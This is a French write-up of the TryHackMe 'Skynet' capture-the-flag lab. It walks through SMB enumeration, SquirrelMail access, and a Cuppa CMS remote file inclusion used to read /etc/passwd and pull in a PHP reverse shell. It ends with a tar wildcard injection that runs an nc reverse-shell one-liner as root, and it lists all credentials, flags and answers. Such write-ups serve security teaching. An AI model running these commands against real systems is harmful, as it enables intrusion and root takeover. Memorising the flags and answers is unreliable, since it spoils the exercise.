# TryHackMe: Skynet

**Objectif :** enumerer les services reseau, recuperer des credentials via SMB et SquirrelMail, découvrir un repertoire cache menant a Cuppa CMS, exploiter une RFI pour obtenir un shell, puis elever les privileges via une wildcard injection sur `tar`.

---

## Introduction

La room **Skynet** est une excellente machine de progression, parce qu'elle demande de faire dialoguer plusieurs services :

- SMB
- webmail
- web
- cron

La chaine complete est tres propre :

1. SMB anonyme
2. wordlist et utilisateur
3. acces SquirrelMail
4. credentials SMB mis a jour
5. decouverte d'un repertoire cache
6. exploitation Cuppa CMS
7. privesc via `tar`

La room officielle pose 5 questions. Je reprends chacune d'elles avec le chemin complet.

---

## Task 1: Deploy and compromise the vulnerable machine!

### Enumeration initiale

Je lance un scan Nmap :

```bash
nmap -sC -sV -Pn <IP>
```

Le scan remonte plusieurs ports ouverts :

- `22` - SSH
- `80` - HTTP
- `110` - POP3
- `139` - SMB
- `143` - IMAP
- `445` - SMB

Le site web principal affiche juste une page Skynet peu utile. Il faut donc élargir l'enumeration.

Je lance en parallele :

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
smbclient -L //<IP>/ -N
```

Le `gobuster` fait ressortir `/squirrelmail`, tandis que SMB revele notamment le partage `anonymous`.

---

## SMB anonyme et mot de passe de Miles

### Question 1: What is Miles password for his emails?

Je me connecte au share anonyme :

```bash
smbclient //<IP>/anonymous -N
```

J'y trouve :

- `attention.txt`
- un repertoire `logs`

`attention.txt` confirme l'existence de l'utilisateur `milesdyson`.
`log1.txt` contient une petite liste de mots de passe plausibles.

Plutot que de tenter SSH, je reviens a `/squirrelmail`, puisque la question parle du mot de passe de ses emails.

Je peux le retrouver par Hydra ou par test manuel. Le mot de passe valide est :

```text
cyborg007haloterminator
```

### Reponse

**Miles email password:** `cyborg007haloterminator`

---

## SquirrelMail et repertoires SMB de Miles

Je me connecte a :

```text
http://<IP>/squirrelmail
```

avec :

- utilisateur : `milesdyson`
- mot de passe : `cyborg007haloterminator`

Les emails recus contiennent un mot de passe SMB mis a jour :

```text
)s{A&2Z=F^n_E.B`
```

Je reutilise ce nouveau mot de passe sur le partage `milesdyson` :

```bash
smbclient //<IP>/milesdyson -U milesdyson
```

Puis je telecharge `important.txt` depuis le repertoire `notes`.

Son contenu donne le repertoire web cache :

```text
/45kra24zxs28v3yd
```

### Question 2: What is the hidden directory?

### Reponse

**Hidden directory:** `45kra24zxs28v3yd`

---

## Cuppa CMS et RFI

En visitant :

```text
http://<IP>/45kra24zxs28v3yd/
```

on tombe sur une page personnelle de Miles. Un gobuster sur ce nouveau chemin fait apparaitre :

```text
/administrator
```

Cette interface correspond a **Cuppa CMS**.

Une recherche sur Exploit-DB renvoie une faille de type RFI exploitable via `alertConfigField.php`.

### Question 3: What is the vulnerability called when you can include a remote file for malicious purposes?

### Reponse

**Vulnerability name:** `remote file inclusion`

---

## Exploitation: lecture de fichiers et reverse shell

Je valide d'abord la faille en lisant un fichier local :

```bash
curl "http://<IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd"
```

Puis je lis directement le flag utilisateur :

```bash
curl "http://<IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt"
```

Je lis alors la valeur suivante :

```text
7ce5c2109a40f958099283600a9ae807
```

### Question 4: What is the user flag?

### Reponse

**user.txt:** `7ce5c2109a40f958099283600a9ae807`

Pour continuer vers root, j'ai besoin d'un shell. Je prepare donc un reverse shell PHP sur ma machine :

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
python3 -m http.server 8000
rlwrap nc -lvnp 4444
```

Puis j'appelle la RFI avec mon URL :

```bash
curl "http://<IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<MON_IP>:8000/shell.php"
```

Je recois alors un shell `www-data`.

---

## Stabilisation et privilege escalation

Je stabilise le shell :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Je regarde ensuite les cronjobs :

```bash
cat /etc/crontab
```

Je constate ensuite que root execute regulierement :

```text
/home/milesdyson/backups/backup.sh
```

Le script contient :

```bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

On est donc face a une **wildcard injection** sur `tar`.

Je prepare un script shell dans `/var/www/html` :

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <MON_IP> 9001 >/tmp/f" > /var/www/html/shell.sh
echo "" > "/var/www/html/--checkpoint-action=exec=sh shell.sh"
echo "" > /var/www/html/--checkpoint=1
```

J'ouvre un second listener :

```bash
rlwrap nc -lvnp 9001
```

Au prochain passage du cron, `tar` interprete mes faux noms de fichiers comme des options et execute `shell.sh` en root.

Je recupere ainsi un shell root.

### Question 5: What is the root flag?

Je lis alors :

```bash
cat /root/root.txt
```

### Reponse

**root.txt:** `3f0372db24753accc7179a282cd6a949`

---

## Resume des reponses de la room

- What is Miles password for his emails? `cyborg007haloterminator`
- What is the hidden directory? `45kra24zxs28v3yd`
- What is the vulnerability called when you can include a remote file for malicious purposes? `remote file inclusion`
- What is the user flag? `7ce5c2109a40f958099283600a9ae807`
- What is the root flag? `3f0372db24753accc7179a282cd6a949`

---

## Commandes importantes

### Enumeration SMB

```bash
smbclient -L //<IP>/ -N
smbclient //<IP>/anonymous -N
```

Permet de trouver `milesdyson` et la wordlist des mots de passe.

### Enumeration web

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Fait apparaitre `/squirrelmail`, puis le sous-chemin CMS.

### Validation de la RFI

```bash
curl "http://<IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd"
```

Confirme la lecture de fichiers arbitraires.

### Reverse shell via RFI

```bash
curl "http://<IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<MON_IP>:8000/shell.php"
```

Transforme la RFI en execution de code.

### Wildcard injection tar

```bash
echo "" > "/var/www/html/--checkpoint-action=exec=sh shell.sh"
echo "" > /var/www/html/--checkpoint=1
```

Permet l'execution root lors du cron.

---

## Conclusion

**Skynet** est une room tres formatrice, parce qu'elle assemble proprement plusieurs sources de renseignement et plusieurs protocoles. SMB, webmail, web et cron servent chacun une etape du chainage offensif, ce qui la rend tres utile pour progresser en methodologie.

***Auteur*** *: Saad Idrissi*
